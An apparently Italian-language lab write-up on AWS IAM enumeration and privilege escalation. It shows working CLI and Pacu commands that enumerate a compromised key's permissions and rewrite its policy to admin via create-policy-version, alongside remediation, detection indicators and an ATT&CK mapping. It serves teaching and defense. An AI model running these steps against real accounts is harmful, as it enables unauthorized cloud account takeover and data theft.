> [English](README.en.md) | **Italiano**

# AWS IAM enumeration & privilege escalation

> - **Fase:** Cloud Security - Identity Attack (AWS IAM)
> - **Visibilita:** Media - le chiamate API sono registrate in CloudTrail; l'enumerazione genera eventi `Describe`/`List`/`Get` visibili a un difensore attento
> - **Prerequisiti:** Un set di credenziali AWS compromesse (access key + secret) - da leak, SSRF su metadata, secret in codice; AWS CLI; enumerate-iam/Pacu
> - **Output:** Finding CLOUD-001; mappa dei permessi dell'identita compromessa; percorso di privilege escalation verso privilegi amministrativi

- **Ambiente Operativo:** AWS (account di laboratorio dell'autore), AWS CLI, Pacu
- **Punto di partenza:** una coppia di chiavi IAM a basso privilegio
- **Tool principali:** aws-cli, enumerate-iam, Pacu, ScoutSuite

---

## Executive summary

Nel cloud, l'identita e il nuovo perimetro. Non esiste piu un firewall di frontiera da superare: chi possiede una credenziale valida e "dentro", e cio che puo fare dipende interamente dai permessi IAM (Identity and Access Management) associati a quella credenziale. L'attacco all'infrastruttura cloud e quindi, prima di tutto, un attacco all'identita: ottenere una credenziale, capire cosa permette e trasformare un accesso limitato in un accesso amministrativo.

L'enumerazione IAM e il primo passo dopo aver ottenuto una credenziale (da un leak su GitHub, da un SSRF sul metadata service, da un secret hardcoded). Si tratta di mappare cosa quella identita puo fare: quali servizi, quali risorse, quali azioni. Il finding CLOUD-001 documenta questa enumerazione e, soprattutto, la ricerca di un percorso di **privilege escalation** - una catena di permessi mal configurati che porta da un ruolo limitato ai privilegi di amministratore.

Il modello di riferimento e lo **Shared Responsibility Model**: AWS protegge l'infrastruttura (hardware, rete fisica, hypervisor), il cliente protegge cio che ci mette dentro (dati, configurazioni, e soprattutto gli accessi IAM). La stragrande maggioranza delle compromissioni cloud non deriva da bug di AWS ma da IAM mal configurato lato cliente - esattamente cio che questo finding esplora.

---

## Struttura della cartella

```
IAM-enumeration/
+-- README.md      # questo file: enumerazione IAM e privilege escalation (CLOUD-001)
+-- img/           # output enumerate-iam e catene di privesc Pacu
```

---

## Enumerazione dei permessi e privilege escalation

**ID Finding:** `CLOUD-001` | **Severity:** `Critico` (una catena di privilege escalation IAM porta da credenziale limitata ad amministratore dell'account)

### Contesto operativo

Ottenuta una credenziale, la prima domanda e "chi sono e cosa posso fare?". `aws sts get-caller-identity` risponde alla prima; l'enumerazione dei permessi alla seconda. Poiche IAM e spesso configurato in modo eccessivamente permissivo, l'analisi dei permessi rivela frequentemente una via di escalation: un permesso apparentemente innocuo (`iam:PassRole`, `iam:CreatePolicyVersion`, `lambda:CreateFunction`) che, combinato, permette di elevarsi ad admin.

### PoC - fase 1: identificazione dell'identita

```Bash
# Chi sono? (identita associata alle credenziali compromesse)
aws sts get-caller-identity
```

```
{
  "UserId": "AIDA...EXAMPLE",
  "Account": "123456789012",
  "Arn": "arn:aws:iam::123456789012:user/svc-deploy"   <-- utente compromesso
}
```

### PoC - fase 2: enumerazione dei permessi

```Bash
# Enumerazione brute delle API accessibili (enumerate-iam)
python3 enumerate-iam.py --access-key AKIA... --secret-key ...
```

```
[+] iam.list_users                    -> ALLOWED
[+] iam.list_attached_user_policies   -> ALLOWED
[+] iam.create_policy_version         -> ALLOWED    <-- permesso pericoloso (privesc)
[+] s3.list_buckets                   -> ALLOWED
```

### PoC - fase 3: percorso di privilege escalation

```Bash
# L'utente puo creare una nuova versione di una policy a cui e collegato:
# iam:CreatePolicyVersion permette di riscrivere i propri permessi -> admin
aws iam create-policy-version \
  --policy-arn arn:aws:iam::123456789012:policy/svc-deploy-policy \
  --policy-document file://admin.json \
  --set-as-default
```

```
# admin.json concede "Action": "*", "Resource": "*"
{ "PolicyVersion": { "VersionId": "v2", "IsDefaultVersion": true } }
[+] Ora svc-deploy ha privilegi amministrativi completi   <-- account takeover (CLOUD-001)
```

### PoC - automazione con Pacu

```Bash
# Pacu ("Metasploit per AWS") automatizza enumerazione e privesc
pacu
> import_keys svc-deploy
> run iam__enum_permissions
> run iam__privesc_scan          # cerca automaticamente le 20+ vie di privesc note
```

```
[iam__privesc_scan] Escalation method found: CreatePolicyVersion
[iam__privesc_scan] Confirmed path to AdministratorAccess   <-- privesc confermata
```

### Remediation

- **Least privilege:** ogni identita deve avere solo i permessi strettamente necessari; evitare wildcard (`Action: "*"`, `Resource: "*"`) e i permessi IAM pericolosi (`iam:*`, `CreatePolicyVersion`, `PassRole` non vincolato)
- **Permission boundaries e SCP:** usare le Permission Boundaries e le Service Control Policy (Organizations) per porre un tetto invalicabile ai privilegi, anche in caso di IAM mal configurato
- **Rilevamento privesc:** strumenti come Prowler e ScoutSuite (`../../../Tooling/`) individuano le catene di privesc prima di un attaccante; auditare regolarmente
- **Rotazione e monitoraggio:** ruotare le chiavi, disabilitare quelle inutilizzate, monitorare CloudTrail per pattern di enumerazione (`Describe`/`List` massivi) e per l'uso di API pericolose (`CreatePolicyVersion`)

---

## Esperienza di laboratorio

Il cambio di paradigma rispetto ai moduli on-premise e stato netto. Nella privilege escalation Linux/Windows (modulo 04) cercavo SUID, kernel exploit, servizi mal configurati; qui l'intero attacco era chiamate API a un servizio di identita. Non c'era un "sistema" da bucare, solo permessi da interrogare e concatenare. Questo ha reso concreto il mantra "l'identita e il nuovo perimetro": la sicurezza cloud e, in larghissima parte, la correttezza della configurazione IAM.

La scoperta piu istruttiva e stata quanto sia sottile la differenza tra un permesso innocuo e uno catastrofico. `iam:CreatePolicyVersion` sembra amministrazione di routine, ma permette a un'identita di riscrivere i propri permessi - una via diretta ad admin. La lista delle 20+ tecniche di privesc IAM documentate da Rhino Security mostra che la maggior parte di questi percorsi nasce da combinazioni di permessi che, presi singolarmente, sembrano ragionevoli. La complessita di IAM e essa stessa la vulnerabilita.

Pacu ha reso l'attacco quasi banale, ma la vera lezione e stata difensiva. Eseguire `iam__privesc_scan` come attaccante e potente; eseguire Prowler o ScoutSuite come difensore trova esattamente le stesse catene, prima. La simmetria e perfetta: lo stesso grafo dei permessi che l'attaccante percorre per elevarsi, il difensore lo analizza per chiuderlo. Nel cloud, l'audit della configurazione e la difesa primaria.

---

## Analisi teorica: L'Identita come superficie d'Attacco

Il cloud dissolve il perimetro di rete tradizionale. On-premise, la difesa e stratificata geograficamente: firewall perimetrale, segmentazione, poi l'host. Nel cloud, ogni servizio e un endpoint API pubblico e l'unico controllo di accesso e l'identita: chi presenta una credenziale valida e autorizzato per cio che quella credenziale permette. Non c'e un "dentro" e un "fuori" di rete; c'e solo "cosa questa identita puo fare". Il perimetro non e piu spaziale ma logico, definito dalle policy IAM.

Questo sposta l'intera superficie d'attacco sulla configurazione degli accessi. Un IAM ben fatto (least privilege, boundaries, nessuna via di privesc) rende l'account difendibile anche se una credenziale trapela: l'attaccante ottiene solo cio che quella specifica identita permetteva, senza vie di espansione. Un IAM mal fatto trasforma qualsiasi leak in un potenziale account takeover, perche una credenziale limitata diventa il punto di partenza di una catena verso admin.

La complessita di IAM e strutturalmente il suo tallone d'Achille. Con centinaia di servizi, migliaia di azioni possibili e policy che si combinano (utente + gruppo + ruolo + resource-based), lo spazio delle configurazioni e enorme e le interazioni non ovvie. Un permesso sicuro in isolamento puo aprire una via di escalation in combinazione con un altro. Questo rende l'analisi automatica (Pacu offensivamente, Prowler/ScoutSuite difensivamente) non un lusso ma una necessita: nessun umano puo ragionare a mano su un grafo di permessi cloud reale. La difesa e capire il proprio IAM meglio di quanto lo capisca l'attaccante.

---

## Scenario reale: proiezione Post-Exploitation

> Questa sezione descrive come questo finding si inserirebbe in un engagement reale, sia dal punto di vista dell'attaccante (Red Team) che del difensore (Blue Team).

### Prospettiva attaccante (red team)

**Punto di partenza:** privilegi amministrativi sull'account AWS ottenuti via privesc IAM da una credenziale limitata (CLOUD-001).

**Passo successivo immediato:** consolidamento dell'accesso e azione sugli obiettivi - accesso a tutti i dati (S3, RDS), creazione di credenziali di persistenza, esplorazione delle risorse.

**Kill Chain proiettata:**

```
[CLOUD-001] Credenziale limitata -> privesc IAM -> Administrator
        |
        v
Persistenza: nuova access key / ruolo backdoor / Lambda schedulata
        |
        v
Accesso ai dati: S3 (CLOUD-002), snapshot RDS, Secrets Manager
        |
        v
Esfiltrazione / distruzione / abuso risorse (cryptomining)
        |
        v
(opzionale) pivoting verso account collegati nell'Organization
```

**Impatto potenziale:** il controllo amministrativo di un account cloud e equivalente al Domain Admin on-premise, ma con la differenza che tutto e accessibile via API da ovunque. L'attaccante puo esfiltrare interi datastore, creare persistenza difficile da individuare (una access key tra migliaia), e abusare delle risorse (il cryptomining su istanze costose e un vettore di monetizzazione comune). Nelle violazioni cloud documentate, il percorso credenziale-leak, privesc IAM, esfiltrazione dati e il pattern dominante.

### Prospettiva difensore (blue team)

**Rilevamento:** CloudTrail registra ogni chiamata API. L'enumerazione massiva (`List`/`Describe`) e l'uso di API di privesc (`CreatePolicyVersion`, `AttachUserPolicy`) sono rilevabili con GuardDuty o regole custom sul log CloudTrail.

**Indicatori di Compromissione (IOC):**
- Picco di chiamate `Describe`/`List`/`Get` da una singola identita (enumerazione)
- Chiamate a API di modifica IAM (`CreatePolicyVersion`, `PutUserPolicy`, `CreateAccessKey`) inaspettate
- Uso di credenziali da IP/geolocalizzazioni anomale o da user-agent di tool (Pacu, boto3 script)
- Creazione di nuove access key o ruoli fuori dai processi normali

**Contenimento:** disabilitazione immediata della credenziale compromessa; revoca delle sessioni; revisione delle modifiche IAM recenti (rollback delle policy version malevole); audit delle risorse toccate.

**Eradicazione e hardening:**
- Least privilege rigoroso + Permission Boundaries + SCP a livello Organization
- Rimozione delle catene di privesc (audit con Prowler/ScoutSuite)
- MFA obbligatoria, chiavi a vita breve (ruoli STS invece di access key statiche)
- GuardDuty attivo + alerting su CloudTrail per le API sensibili

**Lezione difensiva:** nel cloud, la configurazione IAM e la difesa primaria. Un audit regolare che chiude le vie di privesc rende l'account resiliente ai leak di credenziali: se nessuna identita limitata puo elevarsi, un leak resta contenuto. La sicurezza cloud si vince prima dell'incidente, nella correttezza delle policy, non durante.

---

## Tool di riferimento

| tool | tipo | ruolo | caso d'uso principale |
| :--- | :--- | :--- | :--- |
| `aws-cli` | cloud cli | ufficiale | interazione con le api aws, enumerazione manuale |
| `enumerate-iam` | permission enum | offensivo | brute delle api accessibili da una credenziale |
| `Pacu` | exploitation framework | offensivo | "metasploit per aws": enum, privesc, persistenza |
| `ScoutSuite` | multi-cloud audit | difensivo | audit della configurazione (`../../../Tooling/scoutsuite/`) |
| `Prowler` | security scanner | difensivo | centinaia di controlli, catene di privesc (`../../../Tooling/prowler/`) |
| `PMapper` | iam graph analysis | difensivo | grafo dei permessi per individuare le vie di escalation |

> **Tool moderno consigliato:** offensivamente `Pacu` per l'exploitation e `enumerate-iam` per il recon rapido. Difensivamente `Prowler` e `ScoutSuite` per l'audit e `PMapper` per l'analisi a grafo delle vie di privesc IAM. La simmetria e il punto: gli stessi percorsi che l'attaccante cerca, il difensore li chiude con questi strumenti.

---

## Mappatura MITRE ATT&CK

> Riferimento: MITRE ATT&CK for Cloud (IaaS).

| tattica | tecnica | id mitre | descrizione dell'azione |
| :--- | :--- | :--- | :--- |
| discovery | cloud infrastructure discovery | `T1580` | enumerazione delle risorse e dei permessi dell'account (CLOUD-001) |
| privilege escalation | valid accounts: cloud accounts | `T1078.004` | escalation a privilegi amministrativi via iam (CLOUD-001) |
| persistence | account manipulation: additional cloud credentials | `T1098.001` | creazione di nuove credenziali di persistenza |
| discovery | permission groups discovery: cloud groups | `T1069.003` | enumerazione delle policy e dei gruppi iam |
| defense evasion | modify cloud compute infrastructure | `T1578` | modifica delle policy iam per l'escalation |

---

> **Nota:** Tutte le attivita documentate sono state condotte su un account AWS di laboratorio di proprieta dell'autore, con credenziali di test. L'accesso e la manipolazione di account cloud di terzi senza autorizzazione costituisce reato (accesso abusivo) e viola i termini di servizio del provider. Il test di sicurezza cloud richiede autorizzazione esplicita e, per alcune attivita, la notifica al provider. Le tecniche sono documentate a scopo educativo e di security assessment autorizzato.
